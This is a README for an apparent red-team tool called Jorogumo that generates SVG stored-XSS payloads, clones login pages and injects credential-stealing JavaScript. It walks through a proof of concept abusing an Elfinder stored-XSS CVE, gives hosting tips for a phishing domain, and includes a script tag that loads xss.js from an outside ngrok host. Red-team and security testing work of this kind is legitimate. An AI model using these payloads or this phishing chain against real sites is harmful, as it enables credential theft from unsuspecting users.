# Jorōgumo [ 絡新婦 ]
A red team tool written in python for building SVG stored xss payloads, cloning webpages, or implementing custom javascript in pre-existing or cloned webpages.

Author: johnjhacking

ASCII: w0rmer

## Features
![da12503cb7e54226a8e9f8164a6c0694](https://user-images.githubusercontent.com/39013067/228970400-306a5a8f-bcb8-45e1-9227-943e643136db.png)
### Clone a webpage: 

Creates a local copy of the target webpage, which can be used for further customization or attack purposes.
### Create a standalone SVG payload: 

Generates a payload in SVG format, embedding a specified image URL and redirecting users to a specified URL upon interaction.
### Stored Cross-Site Scripting SVG Credential Stealer: 

Clones a login page and injects a script that captures user credentials, and then generates an SVG to be chained with a stored cross-site scripting vulnerability. When the stored cross-site scripting svg payload is triggered, it renders a 404 picture by default, or the custom picture entered by the user, and when clicked, redirects the user to the attacker's malicious login page, where the credential stealer will post credentials to a web request catcher or listener.
### Build a webpage with existing JavaScript and HTML: 

Takes an existing HTML file and adds specified JavaScript code, either from a local file or a remote URL.
### Build a webpage with existing JavaScript but no HTML: 

Clones a webpage and adds specified JavaScript code, either from a local file or a remote URL, into the cloned webpage.
### Custom JavaScript Stored Cross-Site Scripting SVG Payload: 

Clones a webpage and adds specified JavaScript code, either from a local file or a remote URL, into the cloned webpage. Generates an SVG to be chained with a stored cross-site scripting vulnerability. When the stored cross-site scripting svg payload is triggered, it renders a 404 picture by default, or the custom picture entered by the user, and when clicked, redirects the user to the attacker's malicious page, where the custom javascript code will be executed.

## Usage
`git clone https://github.com/SpiderLabs/Jorogumo`

Install the required packages: 

`pip install -r requirements.txt`

Follow the prompt and enter the requested input. Simple javascript code snippets are included in xss.js and cred-stealer.js in the payloads folder, which could be useful if you want to merge them into any of your existing html files for PoC purposes.

## Limitations
- The current version of this script is not built to handle capturing credentials that require 2FA.
- Login forms that don't give you the ability to provide the `username` and `password` input prior to clicking any buttons are not supported. In otherwords, multi-action login forms are not supported in this iteration.
- Some pages or login forms do not clone well, you'll have to keep this in mind when testing your pages to ensure that it looks okay. You could always remove uneccesary third-party elements.
- Ensure that you're hosting on a domain with HTTPS enabled or you're probably going to have issues using the payloads.
- Cross-Origin Read Blocking (CORB) is a thing, so you'll have better luck either implementing your javascript directly in the HTML or ensuring that the .js payload you want to use is hosted on your phishing domain and referenced as such. There's header and content workarounds, but i'd recommend the easy way from the jump.

## Example of Stored Cross-Site Scripting SVG Credential Stealer
**Note, I used the admin panel for the PoC since that's what I have the credentials for, in reality you'd want to clone the main-site login page instead**
### Abusing [CVE-2021-45919](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/from-stored-xss-to-rce-using-beef-and-elfinder-cve-2021-45919/) [ Stored XSS in Elfinder through 2.1.31 ]

#### Malicious SVG is Generated and uploaded to the Subrion admin panel using Elfinder
![b20f44768b554b37b820f7c0941c4c2c](https://user-images.githubusercontent.com/39013067/228977314-a4760a7f-fa0c-42d2-978b-f4ace0af0420.png)

#### Direct Link Hosted on Trusted Domain & Sent to User w/custom 404 page
![a99b0cc85bce434e92ed3c1696bb8821](https://user-images.githubusercontent.com/39013067/228978059-e5c040dd-0821-47f6-b789-961df5a95f8e.png)

#### Victim Clicks - Redirected to Cloned Admin Login
![5895c779f65a40b8bac462569a5ebee9](https://user-images.githubusercontent.com/39013067/228976353-9b525831-5aa6-4e73-ba20-e4374b6b7196.png)

#### Authentication Event Sends Credentials
![6e0d4e0ffd7d40b599c81b64f5b9031f](https://user-images.githubusercontent.com/39013067/228978339-01cbe7da-46d2-4d4b-b065-a45d987e96f4.png)

## Custom JS included in HTML
![583d547a9c1c42e8b1d633ba7be7804d](https://user-images.githubusercontent.com/39013067/228978613-7b86739a-5512-4d6d-a047-c513ecec5132.png)

#### Snippet of Code for Basic XSS included, and Externally Referenced .js
```
<script>
alert('Hacked');
</script>
```
```
<script src="https://32bb-73-181-111-237.ngrok.io/xss.js">
</script>
```
As you can see, the tool uses regular script tags for local .js and script src for external.
